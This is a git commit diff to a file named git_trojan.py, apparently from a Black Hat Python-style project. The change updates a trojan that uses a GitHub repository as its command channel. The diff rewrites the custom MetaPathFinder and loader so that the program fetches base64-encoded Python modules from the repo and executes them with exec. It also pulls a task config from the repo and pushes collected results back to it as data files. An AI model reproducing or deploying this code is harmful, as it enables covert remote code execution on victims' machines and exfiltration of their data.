4a1c354390e82bab4a04c2d42408f5b566584507
LesPrimus <amerigo.armentano@hotmail.it>
2023-06-19 09:33:35 +0200

    Modify MetaPathFinder.

--- bhptrojan/git_trojan.py
+++ bhptrojan/git_trojan.py
@@ -1,6 +1,8 @@
 import base64
+from importlib.abc import MetaPathFinder, Loader
+from importlib.util import spec_from_loader
+
 import github3
-import importlib
 import json
 import random
 import sys
@@ -31,12 +33,11 @@ class Trojan:
 
     def get_config(self):
         config_json = get_file_contents(
-            'config', self.config_file, self.repo
+            'bhptrojan/config', self.config_file, self.repo
         )
         config = json.loads(base64.b64decode(config_json))
-
         for task in config:
-            if module := task['module'] not in sys.modules:
+            if (module := task['module']) not in sys.modules:
                 exec(f"import {module}")
         return config
 
@@ -46,7 +47,7 @@ class Trojan:
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
-        remote_path = f'data/{self.idx}/{message}.data'
+        remote_path = f'bhptrojan/data/{self.idx}/{message}.data'
         bindata = bytes(data, 'utf8')
         self.repo.create_file(
             remote_path, message, base64.b64encode(bindata)
@@ -65,25 +66,24 @@ class Trojan:
             time.sleep(random.randint(30 * 60, 3 * 60 * 60))
 
 
-class GitImporter:
-    def __init__(self):
-        self.current_module_code = ""
+class GitImportLoader(Loader):
+    def __init__(self, data):
+        self.data = data
 
-    # fixme update with find_spec.
-    def find_module(self, name, path=None):
-        print(f"[*] Attempting to retrieve {name}")
+    def exec_module(self, module):
+        return exec(self.data, module.__dict__)
+
+
+class GitImporter(MetaPathFinder):
+
+    def find_spec(self, fullname, path, target=None):
+        print(f"[*] Attempting to retrieve {fullname}")
         self.repo = github_connect()
-        new_library = get_file_contents("modules", f"{name}.py", self.repo)
+        new_library = get_file_contents("bhptrojan/modules", f"{fullname}.py", self.repo)
         if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
-
-    def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
-        new_module = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, new_module.__dict__)
-        sys.modules[spec.name] = new_module
-        return new_module
+            decoded_module = base64.b64decode(new_library)
+            return spec_from_loader(fullname, GitImportLoader(decoded_module))
+        return None
 
 
 if __name__ == '__main__':
